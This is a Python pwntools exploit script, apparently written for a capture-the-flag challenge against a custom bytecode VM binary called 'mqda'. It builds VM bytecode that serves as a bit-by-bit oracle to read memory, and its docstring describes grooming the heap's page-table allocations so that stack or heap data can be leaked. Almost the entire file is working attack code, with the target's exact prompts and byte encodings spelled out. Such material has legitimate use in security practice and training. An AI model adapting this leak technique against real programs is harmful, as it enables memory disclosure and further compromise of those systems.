#!/usr/bin/env python3
"""
Exploit: Try to find and leak data from the process stack

The VM state is on the heap, but it contains a pointer to
the level-1 page table. If we can figure out the heap layout,
we might be able to leak interesting data.

Key insight: When we allocate pages at addresses with different
high bytes (e.g., 0x00xxxxxx, 0x01xxxxxx, etc.), we force
allocation of multiple level-1 page table entries.

The page table structure:
L1[256] -> L2[256] -> L3[256] -> page*

Each level is 256 * 8 = 2048 bytes = malloc(0x800)

If we allocate at address 0x00000000 and 0x01000000, we create:
- L1 table
- L2 for L1[0]
- L3 for L2[0]
- page for L3[0]
- L2 for L1[1] 
- L3 for L2[0]
- page for L3[0]

This creates many 0x810 chunks that might be adjacent to 0x60 chunks.
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_bit_test_code(read_addr, bit_position, expected_bit):
    code = b''
    code += mov_reg_imm(15, read_addr)
    code += pop_reg(0)
    
    shl_amount = 31 - bit_position
    if shl_amount > 0:
        code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_bit(read_addr, bit_position, expected_bit=1):
    code = create_bit_test_code(read_addr, bit_position, expected_bit)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_byte(read_addr):
    val = 0
    for bit in range(8):
        if test_bit(read_addr, bit, 1):
            val |= (1 << bit)
    return val

def main():
    print("[*] Testing stack/heap leak via oracle...")
    
    # The code is loaded at VM address 0. Let's try reading from negative
    # addresses (high unsigned values) which might wrap around or cause
    # page table shenanigans.
    
    # Actually, let's just read from our code and verify it works
    print("[*] Verifying oracle works...")
    byte0 = leak_byte(0)
    print(f"[+] Byte at VM addr 0: 0x{byte0:02x} (expected: 0x41 = mov opcode)")
    
    if byte0 != 0x41:
        print("[-] Oracle verification failed!")
        return
    
    print("[+] Oracle works!")
    
    # Now, can we read from very high addresses?
    # Let's try 0xFFFFFFFF - this would require many page table allocations
    # and might cause interesting behavior
    
    print("\n[*] Trying to read from address 0xFFFF0000...")
    # First allocate something at that address to create the page tables
    code = b''
    code += mov_reg_imm(15, 0xFFFF0000)
    code += mov_reg_imm(0, 0x12345678)
    code += push_reg(0)
    code += hlt()
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    print(f"[*] High address allocation: {output}")
    p.close()
    
    # Now try to leak from that page
    print("\n[*] Leaking byte from 0xFFFF0000...")
    byte_high = leak_byte(0xFFFF0000)
    print(f"[+] Byte at 0xFFFF0000: 0x{byte_high:02x}")

if __name__ == '__main__':
    main()
